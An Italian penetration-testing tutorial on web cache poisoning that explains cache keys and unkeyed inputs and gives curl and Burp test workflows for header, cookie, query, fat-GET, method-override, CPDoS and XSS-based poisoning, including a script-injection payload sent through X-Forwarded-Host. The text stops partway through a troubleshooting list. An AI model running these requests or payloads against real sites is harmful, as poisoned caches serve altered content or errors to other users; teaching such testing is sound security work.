---
title: 'Web Cache Poisoning: Test, Cache Key e Tecniche di Bypass'
slug: cache-poisoning
description: 'Guida pratica al Web Cache Poisoning nel pentest : analizza cache key e unkeyed input, testa header e fat GET con Burp e applica detection e mitigazioni utili.'
image: /cache-poisoning-hhtp-pentest.webp
draft: true
date: 2026-08-03T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - web-cache
  - cache-poisoning
  - burp-suite
  - reverse-proxy
featured: true
---

# Web Cache Poisoning: come testare e avvelenare una cache HTTP

> **TL;DR:** il Web Cache Poisoning si verifica quando un input controllato dall’utente modifica la risposta generata dal server, ma non viene incluso nella cache key. La risposta alterata viene quindi memorizzata e servita ad altri utenti. Per confermare la vulnerabilità devi individuare una risorsa cacheabile, isolare il test, trovare un input non incluso nella chiave e dimostrare che una richiesta pulita riceve ancora il contenuto avvelenato.

Il **Web Cache Poisoning**, spesso abbreviato in **Cache Poisoning**, è una vulnerabilità che permette di inserire nella cache HTTP una risposta modificata dall’attaccante.

Quando un altro utente visita la stessa pagina, il CDN o il reverse proxy può restituire la risposta avvelenata senza interrogare nuovamente il server applicativo.

L’impatto dipende dal modo in cui l’input controllato viene inserito nella risposta. Un attacco riuscito può distribuire:

* contenuti falsi;
* redirect verso domini esterni;
* URL assoluti controllati;
* file JavaScript caricati da un server esterno;
* errori persistenti;
* configurazioni errate;
* denial of service;
* una [Cross-Site Scripting](https://hackita.it/articoli/xss/) distribuita a più utenti.

Il Cache Poisoning riguarda la cache HTTP di CDN, reverse proxy, gateway e applicazioni. Non deve essere confuso con il DNS cache poisoning o con la modifica diretta di database come Redis e Memcached.

La specifica di riferimento per il comportamento delle cache HTTP è l’[RFC 9111](https://datatracker.ietf.org/doc/html/rfc9111).

***

## Come funziona una cache HTTP?

Una cache si trova normalmente tra il client e il server applicativo:

```text
Browser
   ↓
CDN o reverse proxy
   ↓
Server applicativo
```

Quando una risorsa viene richiesta per la prima volta:

```http
GET /news HTTP/1.1
Host: target.example
```

la cache potrebbe non avere ancora una copia della risposta:

```text
Cache MISS
```

La richiesta viene inoltrata al backend, che genera la pagina. Se la risposta rispetta i criteri di caching, viene memorizzata.

Una richiesta successiva considerata equivalente può ricevere direttamente la copia salvata:

```text
Cache HIT
```

Il backend non viene necessariamente contattato.

Per comprendere meglio metodi, header, richieste e risposte consulta anche la guida Hackita alla [porta 80 e al protocollo HTTP](https://hackita.it/articoli/porta-80-http/).

***

## Cos’è la cache key?

La **cache key** è l’identificatore usato dalla cache per decidere se due richieste devono condividere la stessa risposta.

Una cache key può comprendere:

```text
metodo HTTP
schema
hostname
porta
path
query string
header selezionati
cookie selezionati
```

La composizione reale dipende dal CDN, dal reverse proxy e dalla configurazione applicata.

Esempio semplificato:

```text
GET + https + target.example + /products?id=10
```

Due richieste possono contenere header e cookie differenti, ma essere considerate equivalenti se quei valori non sono inclusi nella cache key.

Un valore che influenza la risposta ma non la chiave viene spesso definito **unkeyed input**.

```text
Input controllabile
        +
Modifica la risposta
        +
Non modifica la cache key
        +
Risposta cacheabile
        =
Web Cache Poisoning
```

***

## Esempio semplice di Cache Poisoning

Considera queste richieste:

```http
GET / HTTP/1.1
Host: target.example
```

```http
GET / HTTP/1.1
Host: target.example
X-Forwarded-Host: cache-test.example
```

La cache potrebbe usare soltanto hostname e path per costruire la chiave.

Il backend potrebbe invece usare `X-Forwarded-Host` per creare un URL assoluto:

```html
<script src="https://cache-test.example/static/app.js"></script>
```

Se la risposta viene memorizzata con la stessa chiave della richiesta normale, un utente che non invia l’header potrebbe ricevere comunque:

```html
<script src="https://cache-test.example/static/app.js"></script>
```

La vulnerabilità esiste perché `X-Forwarded-Host`:

1. viene controllato dal client;
2. influenza la risposta;
3. non differenzia la cache entry;
4. produce una risposta memorizzabile.

***

## Cache Poisoning e Web Cache Deception: differenze

Le due tecniche coinvolgono una cache, ma hanno obiettivi differenti.

| Tecnica                 | Obiettivo                                                         |
| ----------------------- | ----------------------------------------------------------------- |
| Web Cache Poisoning     | Memorizzare una risposta alterata e distribuirla ad altri utenti  |
| Web Cache Deception     | Indurre la cache a memorizzare una risposta privata della vittima |
| Cache Poisoned DoS      | Memorizzare una risposta di errore e causare indisponibilità      |
| Browser Cache Poisoning | Alterare una risposta memorizzata nella cache privata del browser |

Nel Cache Poisoning l’attaccante influenza il contenuto.

Nella Cache Deception la risposta contiene normalmente dati legittimi, ma non dovrebbe essere stata salvata in una cache condivisa.

***

## Quali condizioni servono?

Per confermare un Web Cache Poisoning servono normalmente quattro condizioni:

| Condizione                        | Come verificarla                                            |
| --------------------------------- | ----------------------------------------------------------- |
| La risorsa è cacheabile           | La risposta passa da MISS a HIT oppure aumenta `Age`        |
| Esiste un input controllabile     | Header, cookie, parametro, body o path                      |
| L’input modifica la risposta      | Compare un marker nel body o negli header                   |
| L’input non fa parte della chiave | Il marker resta nella risposta quando l’input viene rimosso |

La sola presenza di un CDN non dimostra la vulnerabilità.

La sola riflessione di un header non dimostra che la risposta sia memorizzata.

Un `X-Cache: HIT` non dimostra che il contenuto avvelenato venga servito agli altri utenti.

***

## Cosa sono cache oracle e cache gadget?

### Cache oracle

Un **cache oracle** è una pagina o una risorsa che permette di osservare in modo affidabile il comportamento della cache.

Una buona cache oracle:

* è accessibile senza effetti distruttivi;
* viene memorizzata rapidamente;
* espone `Age`, `X-Cache` o indicatori equivalenti;
* permette di isolare la cache key;
* ha un TTL abbastanza lungo da eseguire il test;
* non contiene dati personali.

### Cache gadget

Un **cache gadget** è un comportamento del backend che permette a un input controllato di modificare la risposta.

Esempi:

* un header modifica un URL assoluto;
* un cookie cambia il contenuto della pagina;
* un parametro viene riflesso in JavaScript;
* la porta modifica un redirect;
* il body di una GET cambia la risposta;
* un path alternativo provoca un errore cacheabile.

Il Cache Poisoning richiede normalmente entrambi:

```text
Cache oracle
     +
Gadget controllabile
     =
Possibile exploit
```

***

## Come riconoscere una risposta memorizzata?

Controlla gli header:

```text
Age
X-Cache
X-Cache-Hits
CF-Cache-Status
X-Served-By
Via
Server-Timing
Cache-Control
Vary
```

Esempio:

```http
HTTP/2 200 OK
Cache-Control: public, max-age=300
Age: 28
X-Cache: HIT
Via: 1.1 varnish
```

Valori frequenti:

```text
HIT
MISS
BYPASS
DYNAMIC
EXPIRED
REVALIDATED
STALE
```

I nomi e i significati precisi dipendono dalla tecnologia.

L’assenza di un header esplicito non dimostra che la cache non esista. Puoi confrontare:

* latenza;
* header `Date`;
* valore `Age`;
* contenuto restituito;
* TTL osservato;
* comportamento dopo richieste identiche;
* differenze usando un cache buster.

### Test ripetuto

```bash
URL="https://target.example/page?cb=test-a83f10"

for i in 1 2 3; do
  echo "=== REQUEST $i ==="

  curl -sk -o /dev/null -D - "$URL" |
    grep -Ei \
      '^(HTTP/|age:|x-cache:|x-cache-hits:|cf-cache-status:|via:|cache-control:|vary:|date:)'

  sleep 2
done
```

Un passaggio da `MISS` a `HIT` è un indicatore utile, ma devi verificare anche il body.

***

## Come interpretare Cache-Control?

Le direttive principali non devono essere confuse.

| Direttiva                | Significato                                                                  |
| ------------------------ | ---------------------------------------------------------------------------- |
| `no-store`               | La risposta non deve essere memorizzata                                      |
| `no-cache`               | La risposta può essere salvata, ma deve essere validata prima del riuso      |
| `private`                | La risposta non deve essere salvata da cache condivise                       |
| `public`                 | Consente esplicitamente la memorizzazione condivisa                          |
| `max-age`                | Durata della freschezza in secondi                                           |
| `s-maxage`               | TTL specifico per cache condivise                                            |
| `must-revalidate`        | Dopo la scadenza richiede una validazione                                    |
| `stale-while-revalidate` | Permette di servire temporaneamente contenuto scaduto durante la validazione |
| `stale-if-error`         | Permette di servire una copia scaduta se l’origin fallisce                   |

Questa risposta può essere memorizzata, nonostante il nome della direttiva:

```http
Cache-Control: no-cache
```

Questa indica invece che il contenuto non deve essere memorizzato:

```http
Cache-Control: no-store
```

***

## Come funziona Vary?

L’header `Vary` indica quali header della richiesta devono essere confrontati quando una cache decide se riutilizzare una risposta.

Esempio:

```http
Vary: Accept-Encoding
```

La cache può conservare varianti differenti per:

```text
Accept-Encoding: gzip
Accept-Encoding: br
```

Altro esempio:

```http
Vary: Accept-Language
```

La risposta italiana può essere separata da quella inglese.

`Vary` non corregge automaticamente il Cache Poisoning. Se il backend usa `X-Forwarded-Host` ma la cache varia soltanto per `Accept-Encoding`, l’header proxy potrebbe rimanere escluso dal matching.

Un valore elencato in `Vary` può anche essere utilizzato per un poisoning mirato a uno specifico browser, lingua o user agent.

***

## Testing sicuro: prima usa un marker innocuo

Il Cache Poisoning può modificare una risposta condivisa con utenti reali.

Non iniziare il test sulla home page di produzione e non usare immediatamente JavaScript.

Usa un marker innocuo:

```text
cache-test-a83f10.example
```

Evita inizialmente:

```html
<script>alert(document.cookie)</script>
```

Prima devi dimostrare soltanto che:

1. il marker modifica la risposta;
2. la risposta viene memorizzata;
3. una richiesta pulita riceve lo stesso marker.

***

## Il cache buster è realmente incluso nella chiave?

Un parametro casuale viene spesso usato per isolare il test:

```text
?cb=a83f10
```

Non devi però presumere che il parametro partecipi alla cache key.

Verificalo con valori differenti:

```bash
URL="https://target.example/page"

curl -sk -D /tmp/cb-a.headers \
  -o /tmp/cb-a.body \
  "$URL?cb=aaa111"

curl -sk -D /tmp/cb-b.headers \
  -o /tmp/cb-b.body \
  "$URL?cb=bbb222"
```

Confronta:

```bash
diff -u /tmp/cb-a.headers /tmp/cb-b.headers
diff -u /tmp/cb-a.body /tmp/cb-b.body
```

Ripeti più volte ciascuna variante.

Se richieste con cache buster differenti ricevono la stessa entry, la query string o il parametro potrebbero essere esclusi dalla chiave.

In quel caso interrompi il test sulla risorsa condivisa.

***

## Workflow A/B/A/B corretto

Questo è il metodo più affidabile per confermare la vulnerabilità.

```bash
URL="https://target.example/page"
KEY="cb-$(openssl rand -hex 6)"
CLEAN_KEY="cb-$(openssl rand -hex 6)"
MARKER="cache-test-$(openssl rand -hex 6).example"
```

### A — Baseline isolata

```bash
curl -sk \
  -D /tmp/a.headers \
  -o /tmp/a.body \
  "$URL?cb=$KEY"
```

Il marker non deve comparire:

```bash
grep -Rni "$MARKER" /tmp/a.headers /tmp/a.body
```

### B — Richiesta con input controllato

```bash
curl -sk \
  -D /tmp/b.headers \
  -o /tmp/b.body \
  -H "X-Forwarded-Host: $MARKER" \
  "$URL?cb=$KEY"
```

Verifica che il marker modifichi la risposta:

```bash
grep -Rni "$MARKER" /tmp/b.headers /tmp/b.body
```

### A2 — Richiesta pulita sulla stessa chiave

```bash
curl -sk \
  -D /tmp/a2.headers \
  -o /tmp/a2.body \
  "$URL?cb=$KEY"
```

Conferma che il marker sia ancora presente:

```bash
grep -Rni "$MARKER" /tmp/a2.headers /tmp/a2.body
```

Controlla anche:

```bash
grep -Ei \
  '^(age|x-cache|x-cache-hits|cf-cache-status|via|cache-control|vary):' \
  /tmp/a2.headers
```

### C — Chiave di controllo differente

```bash
curl -sk \
  -D /tmp/c.headers \
  -o /tmp/c.body \
  "$URL?cb=$CLEAN_KEY"
```

Il marker non deve essere presente:

```bash
grep -Rni "$MARKER" /tmp/c.headers /tmp/c.body
```

Risultato compatibile con Cache Poisoning:

```text
A  → risposta pulita
B  → marker nella risposta
A2 → marker ancora presente senza header
C  → risposta pulita con una chiave differente
```

***

## Tecnica 1 — Header non inclusi nella cache key

Gli header più interessanti dipendono dall’infrastruttura.

Candidati frequenti:

```text
X-Forwarded-Host
X-Host
X-Forwarded-Server
Forwarded
X-Forwarded-Proto
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
X-HTTP-Method-Override
X-Forwarded-Port
```

Non inviarli tutti insieme.

Modifica un solo header alla volta per identificare quello responsabile della differenza.

### X-Forwarded-Host

```bash
BUSTER="cb-$(openssl rand -hex 6)"
MARKER="cache-test-$(openssl rand -hex 6).example"

curl -sk \
  -D /tmp/xfh.headers \
  -o /tmp/xfh.body \
  -H "X-Forwarded-Host: $MARKER" \
  "https://target.example/?cb=$BUSTER"
```

Cerca il marker:

```bash
grep -Rni "$MARKER" /tmp/xfh.headers /tmp/xfh.body
```

Potrebbe comparire in:

```html
<link rel="canonical" href="https://cache-test.example/">
```

```html
<meta property="og:url" content="https://cache-test.example/">
```

```html
<script src="https://cache-test.example/static/app.js"></script>
```

Oppure in un redirect:

```http
Location: https://cache-test.example/login
```

Ripeti senza header:

```bash
curl -sk \
  -D /tmp/xfh-clean.headers \
  -o /tmp/xfh-clean.body \
  "https://target.example/?cb=$BUSTER"
```

Se il marker resta presente, verifica il cache status.

Quando un valore controllato viene inserito negli header della risposta, il problema può concatenarsi con una [HTTP Header Injection](https://hackita.it/articoli/http-header-injection/) o con una [CRLF Injection](https://hackita.it/articoli/crlf-injection/).

***

## Tecnica 2 — Host header e host override

Il normale header `Host` partecipa generalmente al routing e alla cache key, ma infrastrutture complesse possono avere comportamenti differenti tra edge e origin.

Esempio controllato:

```http
GET / HTTP/1.1
Host: target.example
X-Host: cache-test.example
```

Altri header possibili:

```text
X-Forwarded-Host
X-Host
X-HTTP-Host-Override
Forwarded: host=cache-test.example
```

Il test è rilevante quando il backend usa l’host alternativo per generare:

* URL canonici;
* link assoluti;
* URL di reset;
* redirect;
* import di risorse;
* riferimenti Open Graph.

Un semplice:

```bash
curl -H "Host: cache-test.example" https://TARGET/
```

non dimostra da solo il Cache Poisoning.

Devi sempre completare il workflow A/B/A.

***

## Tecnica 3 — Protocollo, porta e redirect

Alcune applicazioni si fidano di header proxy per determinare schema e porta originali.

Payload:

```http
X-Forwarded-Proto: http
X-Forwarded-Scheme: http
X-Forwarded-Ssl: off
Front-End-Https: off
X-Forwarded-Port: 1337
```

Esempio:

```bash
curl -sk -i \
  -H "X-Forwarded-Proto: http" \
  "https://target.example/?cb=a83f10"
```

Possibile risultato:

```http
HTTP/2 301
Location: http://target.example/
```

Con porta alterata:

```bash
curl -sk -i \
  -H "X-Forwarded-Port: 1337" \
  "https://target.example/?cb=a83f10"
```

Possibile redirect:

```http
Location: https://target.example:1337/login
```

Se il redirect viene memorizzato e la porta o il protocollo non partecipano alla chiave, gli utenti possono ricevere una destinazione errata.

Se la destinazione è controllabile, l’impatto può concatenarsi con un [Open Redirect](https://hackita.it/articoli/open-redirect/).

***

## Tecnica 4 — Cookie non incluso nella cache key

I cookie possono modificare:

* lingua;
* valuta;
* tema;
* variante A/B;
* dispositivo;
* banner;
* configurazioni frontend.

Esempio:

```http
Cookie: language=it
```

Test:

```bash
BUSTER="cb-$(openssl rand -hex 6)"

curl -sk \
  -D /tmp/cookie.headers \
  -o /tmp/cookie.body \
  -H "Cookie: language=it" \
  "https://target.example/article?$BUSTER"

curl -sk \
  -D /tmp/cookie-clean.headers \
  -o /tmp/cookie-clean.body \
  "https://target.example/article?$BUSTER"

diff -u /tmp/cookie.body /tmp/cookie-clean.body
```

La vulnerabilità è confermata soltanto se:

1. il cookie modifica la risposta;
2. la risposta viene memorizzata;
3. la variante viene restituita senza cookie;
4. la richiesta pulita condivide la stessa cache key.

Controlla anche:

```http
Vary: Cookie
```

Molte cache non includono l’intero header `Cookie` nella chiave perché produrrebbe un numero enorme di varianti.

***

## Tecnica 5 — Query string completamente esclusa

Alcune cache ignorano l’intera query string.

Confronta:

```text
/page?value=one
/page?value=two
```

Se entrambe le richieste condividono la stessa entry ma il backend riflette la query, può essere possibile avvelenare la versione base di `/page`.

Test:

```bash
curl -sk \
  -D /tmp/query-one.headers \
  -o /tmp/query-one.body \
  "https://target.example/page?value=cache-test-one"

curl -sk \
  -D /tmp/query-two.headers \
  -o /tmp/query-two.body \
  "https://target.example/page?value=cache-test-two"
```

Ripeti le richieste in ordine differente e verifica quale valore rimane nella cache.

Questo test è rischioso perché un cache buster nella query potrebbe essere ignorato. Eseguilo soltanto su un endpoint isolato o in laboratorio.

***

## Tecnica 6 — Parametro escluso dalla cache key

CDN e reverse proxy possono escludere parametri usati per analytics:

```text
utm_source
utm_medium
utm_campaign
utm_content
fbclid
gclid
```

Il backend potrebbe comunque leggerli o rifletterli.

Esempio:

```text
/search?q=phone&utm_content=cache-test
```

Test:

```bash
curl -sk \
  -D /tmp/utm-one.headers \
  -o /tmp/utm-one.body \
  "https://target.example/search?q=phone&utm_content=one"

curl -sk \
  -D /tmp/utm-clean.headers \
  -o /tmp/utm-clean.body \
  "https://target.example/search?q=phone"
```

Se `utm_content` è escluso dalla chiave e il valore `one` rimane nella risposta pulita, il parametro è un possibile vettore.

***

## Tecnica 7 — Cache parameter cloaking

Il **parameter cloaking** sfrutta differenze nel parsing tra cache e backend.

Esempio:

```text
?utm_content=abc;callback=cache-test
```

La cache potrebbe interpretare:

```text
utm_content = abc;callback=cache-test
```

e ignorare tutto il parametro perché `utm_content` è escluso dalla chiave.

Il backend potrebbe invece interpretare:

```text
utm_content = abc
callback = cache-test
```

Varianti da confrontare:

```text
?utm_content=abc;callback=one
?utm_content=abc%3Bcallback=two
?utm_content=abc&callback=three
?utm_content=abc%26callback=four
```

Test:

```bash
curl -sk \
  --path-as-is \
  -D /tmp/cloak.headers \
  -o /tmp/cloak.body \
  "https://target.example/?utm_content=abc;callback=cache-test"
```

Non esiste un separatore universale.

Il risultato dipende da:

* linguaggio;
* framework;
* reverse proxy;
* parser della cache;
* normalizzazione URL;
* decodifica applicata.

***

## Tecnica 8 — Fat GET

Una **fat GET** è una richiesta GET con un body.

```http
GET /preferences HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

language=cache-test
```

Molte cache costruiscono la chiave senza considerare il body della GET.

Alcuni backend, invece, elaborano quel body.

Test:

```bash
BUSTER="cb-$(openssl rand -hex 6)"

curl -sk \
  -X GET \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "language=cache-test" \
  -D /tmp/fat-get.headers \
  -o /tmp/fat-get.body \
  "https://target.example/preferences?$BUSTER"
```

Richiesta pulita:

```bash
curl -sk \
  -D /tmp/fat-get-clean.headers \
  -o /tmp/fat-get-clean.body \
  "https://target.example/preferences?$BUSTER"
```

Confronta:

```bash
diff -u /tmp/fat-get.body /tmp/fat-get-clean.body
```

Il test ha valore soltanto se il body influenza realmente la risposta.

***

## Tecnica 9 — Method override

Alcuni framework supportano:

```http
X-HTTP-Method-Override: POST
X-HTTP-Method: POST
X-Method-Override: POST
```

Esempio:

```bash
curl -sk \
  -H "X-HTTP-Method-Override: POST" \
  "https://target.example/resource?cb=a83f10"
```

Il backend potrebbe trattare la richiesta come POST, mentre la cache continua a considerarla una GET.

Possibile conseguenza:

```text
cache key GET
        +
risposta generata dal percorso POST
        =
risposta sbagliata salvata come GET
```

Il test è pertinente soltanto quando l’applicazione supporta il method override.

***

## Tecnica 10 — Unkeyed port

In alcune configurazioni, la cache normalizza o rimuove la porta dalla chiave mentre il backend la usa per generare la risposta.

Richiesta:

```http
GET / HTTP/1.1
Host: target.example:1337
```

Possibile risposta:

```http
Location: https://target.example:1337/login
```

Con HTTP/1.1 e un IP di destinazione esplicito:

```bash
curl -sk -i \
  --resolve target.example:443:192.0.2.10 \
  -H "Host: target.example:1337" \
  https://target.example/
```

Non eseguire il test se l’header `Host` alterato viene utilizzato per il routing verso virtual host differenti.

***

## Tecnica 11 — Normalized cache key

La cache può normalizzare il percorso prima di creare la chiave, mentre il backend riflette o interpreta il path originale.

Varianti:

```text
/page
//page
/./page
/page/
/page%2f
/page%2e
/page;test
/%70age
```

Test:

```bash
curl -sk -i \
  --path-as-is \
  "https://target.example/./page?cb=a83f10"
```

Confronto automatico:

```bash
paths=(
  "/page"
  "//page"
  "/./page"
  "/page/"
  "/page%2f"
  "/page;test"
)

for path in "${paths[@]}"; do
  curl -sk \
    --path-as-is \
    -o "/tmp/path-$(echo "$path" | tr '/%' '__').body" \
    -w "$path -> %{http_code} %{size_download}\n" \
    "https://target.example$path?cb=a83f10"
done
```

Il problema può verificarsi in due direzioni:

1. percorsi differenti vengono normalizzati nella stessa chiave;
2. lo stesso percorso logico produce chiavi differenti tra cache e backend.

***

## Tecnica 12 — Cache key injection

La **cache key injection** si verifica quando un valore controllato viene inserito nella chiave senza una separazione o codifica non ambigua.

Esempio concettuale:

```text
chiave = host + path + parametro
```

Se i componenti vengono concatenati senza delimitatori sicuri:

```text
host=a
path=/bc
```

potrebbe produrre la stessa rappresentazione di:

```text
host=ab
path=/c
```

Altri problemi possibili:

* newline nel valore;
* delimitatori non escaped;
* header duplicati;
* normalizzazione differente;
* collisioni tra query e path;
* percent encoding interpretato in fasi differenti.

Questo scenario è avanzato e dipende completamente dall’implementazione.

Non va confermato soltanto perché un valore viene riflesso: devi dimostrare una collisione riproducibile tra due richieste differenti.

***

## Tecnica 13 — Targeted Cache Poisoning

Una cache può creare varianti sulla base di:

```http
Vary: User-Agent
```

oppure:

```http
Vary: Accept-Language
```

Un attaccante potrebbe avvelenare soltanto la variante destinata a:

* un browser specifico;
* un dispositivo mobile;
* una lingua;
* un crawler;
* un determinato gruppo di utenti.

Esempio:

```bash
curl -sk \
  -H "User-Agent: Mozilla/5.0 TARGET-UA" \
  -H "X-Forwarded-Host: cache-test.example" \
  "https://target.example/?cb=a83f10"
```

La richiesta di verifica deve utilizzare lo stesso `User-Agent`:

```bash
curl -sk \
  -H "User-Agent: Mozilla/5.0 TARGET-UA" \
  "https://target.example/?cb=a83f10"
```

Una richiesta con user agent differente potrebbe ricevere una variante pulita e produrre un falso negativo.

***

## Tecnica 14 — Internal Cache Poisoning

Un’applicazione può utilizzare più livelli:

```text
CDN esterno
    ↓
reverse proxy
    ↓
cache applicativa
    ↓
origin
```

Un cache buster potrebbe isolare la cache esterna ma non quella interna.

Possibile comportamento:

```text
/query?cb=one → CDN key differente
/query?cb=two → CDN key differente

Entrambe raggiungono la stessa entry nella cache interna
```

Indicatori:

* il marker compare su cache buster differenti;
* l’edge restituisce MISS, ma il body rimane identico;
* il TTL osservato non coincide;
* gli header di cache esterna cambiano, ma il contenuto interno no;
* il comportamento varia tra PoP.

Per confermare una cache interna devi distinguere:

```text
risposta prodotta dall’origin
risposta prodotta dalla cache applicativa
risposta prodotta dal CDN
```

Registra separatamente header, tempi e TTL di ogni livello osservabile.

***

## Tecnica 15 — Cache Poisoned Denial of Service

Il **Cache Poisoned DoS**, abbreviato in CPDoS, si verifica quando una richiesta anomala provoca una risposta di errore che viene memorizzata.

Possibili cause:

* header troppo grande;
* porta non valida;
* path anomalo;
* method override;
* header proxy;
* errore del backend;
* metodo non supportato;
* normalizzazione incoerente.

Flusso:

```text
Richiesta anomala
      ↓
Backend genera 400, 403, 404 o 500
      ↓
La cache memorizza l’errore
      ↓
Gli utenti ricevono la risposta inutilizzabile
```

Test innocuo su una route dedicata:

```bash
BUSTER="cb-$(openssl rand -hex 6)"

curl -sk \
  -D /tmp/cpdos.headers \
  -o /tmp/cpdos.body \
  -H "X-Forwarded-Port: invalid" \
  "https://target.example/test-cache?$BUSTER"
```

Ripeti senza header e verifica se l’errore permane.

Non testare CPDoS su home page, endpoint di login o API critiche senza una finestra concordata.

***

## Tecnica 16 — Poisoning tramite errori e status code

Una cache può memorizzare status differenti da `200 OK`, a seconda della configurazione.

Possibili risposte:

```text
301
302
404
410
500
503
```

Controlla:

```http
Cache-Control
Surrogate-Control
CDN-Cache-Control
Expires
Age
```

Un errore momentaneo può diventare persistente se il CDN assegna un TTL agli errori.

Esempio:

```bash
curl -sk -i \
  -H "X-Original-URL: /does-not-exist" \
  "https://target.example/?cb=a83f10"
```

Ripeti senza header e controlla se il `404` rimane associato alla route normale.

***

## Tecnica 17 — Poisoning tramite XSS

Il Cache Poisoning può trasformare un’iniezione riflessa in un vettore distribuito.

Prima usa sempre un marker:

```text
cache-test-a83f10
```

Solo dopo la conferma in laboratorio puoi verificare il contesto HTML:

```html
"><script>alert(document.domain)</script>
```

Esempio concettuale:

```bash
curl -sk \
  -H 'X-Forwarded-Host: "><script>alert(document.domain)</script>' \
  "https://target.example/?cb=a83f10"
```

La presenza del payload nel body non basta.

Devi dimostrare:

1. contesto eseguibile;
2. assenza di encoding;
3. risposta memorizzata;
4. richiesta pulita che riceve il payload;
5. compatibilità con CSP e browser.

Per payload, contesti e bypass consulta l’articolo dedicato alla [XSS](https://hackita.it/articoli/xss/).

***

## Tecnica 18 — Concatenazione con HTTP Request Smuggling

Il [HTTP Request Smuggling](https://hackita.it/articoli/http-request-smuggling/) sfrutta una differenza nel modo in cui front-end e back-end delimitano le richieste.

Quando una cache è coinvolta, lo smuggling può:

* associare una risposta al percorso sbagliato;
* contaminare la risposta della richiesta successiva;
* avvelenare una cache entry;
* bypassare la cache key prevista.

Questo workflow non è equivalente al normale Cache Poisoning tramite header.

Richiede:

* almeno due parser HTTP;
* una desincronizzazione reale;
* controllo dell’ordine delle richieste;
* conferma della risposta associata alla chiave sbagliata.

Non aggiungere payload CL.TE o TE.CL a questo articolo: devono rimanere nella guida specifica sul Request Smuggling per evitare cannibalizzazione e confusione tecnica.

***

## Param Miner con Burp Suite

**Param Miner** è un’estensione di [Burp Suite](https://hackita.it/articoli/burp-suite/) utile per individuare input nascosti.

Può cercare:

* header non documentati;
* query parameter;
* cookie;
* input potenzialmente esclusi dalla cache key;
* parameter cloaking;
* fat GET;
* cache poisoning basato su variazioni minime.

Workflow:

```text
1. Trova una cache oracle.
2. Invia la richiesta al Repeater.
3. Aggiungi un cache buster verificato.
4. Clic destro sulla richiesta.
5. Guess headers o Guess GET parameters.
6. Analizza le differenze rilevate.
7. Sostituisci il valore con un marker innocuo.
8. Esegui il workflow A/B/A.
9. Conferma manualmente cache HIT e persistenza.
```

Non considerare ogni risultato di Param Miner come vulnerabilità.

L’estensione identifica input che modificano la risposta. Devi ancora dimostrare che l’input non differenzi la cache key.

La metodologia completa e i laboratori sono disponibili nella [Web Security Academy di PortSwigger](https://portswigger.net/web-security/web-cache-poisoning).

***

## Test manuale degli header

Lista iniziale prudente:

```bash
headers=(
  "X-Forwarded-Host"
  "X-Host"
  "X-Forwarded-Server"
  "X-Forwarded-Proto"
  "X-Forwarded-Scheme"
  "X-Forwarded-Port"
  "X-Original-URL"
  "X-Rewrite-URL"
  "X-HTTP-Method-Override"
)

URL="https://target.example/page"
BUSTER="cb-$(openssl rand -hex 6)"
MARKER="cache-test-$(openssl rand -hex 6).example"

for header in "${headers[@]}"; do
  safe_name=$(echo "$header" | tr '[:upper:]' '[:lower:]')

  curl -sk \
    -D "/tmp/$safe_name.headers" \
    -o "/tmp/$safe_name.body" \
    -H "$header: $MARKER" \
    "$URL?$BUSTER"

  if grep -Rqi "$MARKER" \
    "/tmp/$safe_name.headers" \
    "/tmp/$safe_name.body"; then
    echo "[+] $header modifica la risposta"
  else
    echo "[-] $header non riflesso"
  fi
done
```

Questo script identifica soltanto differenze o riflessioni.

Non conferma il caching del marker.

***

## Matrice prerequisito, test e risultato

| Prerequisito        | Test                       | Risultato utile                       |
| ------------------- | -------------------------- | ------------------------------------- |
| Risorsa cacheabile  | Ripeti la stessa richiesta | MISS seguito da HIT                   |
| Cache key isolabile | Cambia cache buster        | Entry differenti                      |
| Header interpretato | Inserisci marker           | Marker nella risposta                 |
| Header non incluso  | Rimuovi header             | Marker ancora presente                |
| Query esclusa       | Cambia parametro           | Stessa entry riutilizzata             |
| Cookie escluso      | Rimuovi cookie             | Variante ancora restituita            |
| Fat GET elaborata   | GET con body               | Risposta modificata                   |
| Cache interna       | Cambia key esterna         | Marker persiste tra key differenti    |
| CPDoS               | Genera errore innocuo      | Errore restituito su richiesta pulita |

***

## Cosa supporta e cosa non dimostra ogni test

| Osservazione                 | Cosa dimostra                          | Cosa non dimostra                    |
| ---------------------------- | -------------------------------------- | ------------------------------------ |
| `X-Cache: HIT`               | Una risposta è stata riutilizzata      | Il contenuto è avvelenato            |
| Marker riflesso              | Il backend usa l’input                 | Il marker viene memorizzato          |
| Marker dopo richiesta pulita | Possibile poisoning                    | Che raggiunga tutti i PoP            |
| `Age` aumenta                | Entry riutilizzata                     | Quale livello di cache l’ha prodotta |
| `Vary: Cookie`               | Il cookie contribuisce al matching     | Che tutti i cookie siano inclusi     |
| Query differenti uguali      | Possibile esclusione o normalizzazione | Quale parametro è ignorato           |
| Errore persistente           | Possibile CPDoS                        | Che l’errore sia globale             |
| Differenza di latenza        | Possibile cache                        | Conferma definitiva                  |

***

## Falsi positivi comuni

### Marker riflesso ma non memorizzato

Si tratta di una normale riflessione o injection.

Non è Cache Poisoning.

### HIT senza marker

La risorsa è memorizzata, ma l’input non influenza la risposta condivisa.

### Marker presente soltanto con l’header

L’header potrebbe:

* essere incluso nella cache key;
* produrre una risposta non cacheabile;
* essere elaborato dopo il livello osservato;
* creare una variante separata.

### Edge PoP differenti

Due richieste possono raggiungere nodi CDN diversi.

Confronta:

```text
X-Served-By
CF-Ray
X-Amz-Cf-Pop
Via
Server-Timing
```

### Cache del browser

Usa Burp Repeater o `curl` invece del browser.

### Personalizzazione legittima

Lingua, paese, user agent, dispositivo e A/B testing possono produrre varianti previste.

Controlla `Vary`, cookie e configurazione CDN.

### Cache interna

Un HIT osservato nel body potrebbe provenire da:

* Redis;
* framework;
* microservizio;
* reverse proxy interno;
* CDN esterno.

Identifica il livello reale.

### Risposta stale

La cache potrebbe servire una risposta scaduta tramite:

```text
stale-while-revalidate
stale-if-error
```

Il contenuto può sembrare persistente anche se l’entry è tecnicamente scaduta.

***

## Errori comuni durante il test

### Ogni richiesta restituisce MISS

Possibili cause:

* `Cache-Control: private`;
* `Cache-Control: no-store`;
* presenza di `Authorization`;
* cookie di sessione;
* status non cacheabile;
* query sempre differente;
* TTL molto breve;
* CDN bypassato;
* risposta troppo grande;
* metodo non supportato;
* regola di cache non applicata.

### Il marker non compare

Possibili cause:

* header ignorato;
* valore sovrascritto dal proxy;
